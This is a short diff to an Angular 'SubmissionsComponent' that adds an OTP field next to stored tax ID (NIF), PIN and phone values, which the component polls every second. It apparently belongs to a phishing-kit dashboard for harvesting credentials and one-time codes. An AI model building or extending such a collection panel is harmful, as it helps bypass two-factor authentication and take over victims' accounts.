@@ -8,7 +8,7 @@ import { SubmissionService } from '../submission.service';
   styleUrls: ['./submissions.component.css']
 })
 export class SubmissionsComponent implements OnInit, OnDestroy {
-  submissions: { nif: string, pin: string, phone: string }[] = [];
+  submissions: { nif: string, pin: string, phone: string,otp: string }[] = [];
   private submissionUpdateSubscription!: Subscription;
   private pollingIntervalMs = 1000; // Polling interval in milliseconds (e.g., every 5 seconds)
 
